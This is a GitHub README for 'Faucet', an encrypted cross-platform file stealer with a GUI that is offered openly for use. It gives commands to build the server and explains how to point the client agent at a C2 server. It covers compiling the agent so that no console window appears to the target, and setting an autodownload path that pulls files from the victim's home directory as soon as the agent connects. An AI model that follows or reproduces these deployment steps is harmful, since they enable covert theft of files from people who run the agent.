
<img width=500 src="https://github.com/user-attachments/assets/d5a8c5bb-3cbb-4463-9390-c5e1aaeefaa2"></img>
<p align="center">
<img src="https://img.shields.io/badge/go-%2300ADD8.svg?style=for-the-badge&logo=go&logoColor=white">
<img src="https://img.shields.io/badge/html5-%23E34F26.svg?style=for-the-badge&logo=html5&logoColor=white">
<img src="https://img.shields.io/badge/css3-%231572B6.svg?style=for-the-badge&logo=css3&logoColor=white">
<img src="https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB">
<img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
<img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black">
<img src="https://img.shields.io/badge/mac%20os-000000?style=for-the-badge&logo=macos&logoColor=F0F0F0">
</p>

### Easy to use encrypted cross platform file stealer with an interactive GUI. Yeah that summarizes it pretty well.
Feel free to contribute.

<img src="https://github.com/user-attachments/assets/12251e58-3479-4be7-b8ff-4ea79b87e06f" width=400></img>
<img src="https://github.com/user-attachments/assets/de064cef-4f9f-4391-80ff-7286c92a95e5" width=400></img>

## <b>Server Installation</b>
### Precompiled:
#### Go to releases, download the executable and run it.
### Compile yourself:
1. 
```
git clone https://github.com/Varppi/Faucet
cd Faucet/server
go install github.com/wailsapp/wails/v2/cmd/wails@latest
~/go/bin/wails doctor
```
2. Install any missing dependencies.
3.
```
~/go/bin/wails build
cp build/bin/* ./
```

## <b>Usage</b>
1. Open `global.conf` and change the password.
2. Start server.
3. Modify `client/main.go` and change the C2 server address and password variables to the correct ones.
4. Build the agent: `go build client/main.go` (if you don't want the terminal to pop up: `go build --ldflags -H=windowsgui client/main.go`).
5. When the target runs the agent it should now connect to the server and display the current directory's contents.

## <b>Global.conf settings</b>
* password: Password used to encrypt the traffic.
* listen: Server listener. Format: `<host>:<port>`.
* lootdir: Where Faucet will store downloaded files.
* autodownload: A file/directory to be download the second the agent connects. NOTE: %user% will be translated to the home directory.

### I don't really want skids using this so you have to have enough knowledge to figure out the rest yourself kek
